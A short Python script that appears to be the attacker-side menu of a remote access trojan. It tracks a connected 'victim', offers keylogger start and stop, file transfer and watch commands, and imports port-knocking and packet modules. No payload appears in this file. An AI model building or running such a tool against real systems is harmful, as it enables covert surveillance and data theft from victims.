import os
import subprocess

from enum import StrEnum

from scapy.all import *
from scapy.layers.inet import IP, TCP

from mods.protocol import send_data, receive_data, receive_packet
from mods.knocking import send_port_knocks
from mods.handlers import handle_command
from mods.shared import OPTIONS_LIST

ATTACKER_STATE = {
    'connected_to_victim': True,
    'keylogger_started': False,
}

def _get_available_actions():
    if not ATTACKER_STATE['connected_to_victim']:
        return ['cn', 'ex']

    actions = ['dc', 'sf', 'dl', 'wf', 'wd', 'rn']
    if ATTACKER_STATE['keylogger_started']:
        actions.append('k-')
    else:
        actions.append('k+')
    
    actions.append('ex')
    return actions

def _print_menu(logs: str = ''):
    while True:
        subprocess.run('cls' if os.name == 'nt' else 'clear', shell=True)
        print('Choose action:')
        valid_actions = _get_available_actions()
        for a in valid_actions:
            print(f'{a} {OPTIONS_LIST[a]}')

        print('\n========== output ==========')
        print(f'{logs}')
        print('============================')
        command = input("\n\t Command: ").strip()
        parts = command.split(' ')

        return parts[0], parts[1:]


def run_menu():
    logs = '...'

    while True:
        command, args = _print_menu(logs)

        if command == 'ex':
            print('Exiting...')
            return
        else:
            logs = handle_command(command, args, ATTACKER_STATE)

def main():
    print('hello from server')
    run_menu()


if __name__ == "__main__":
    main()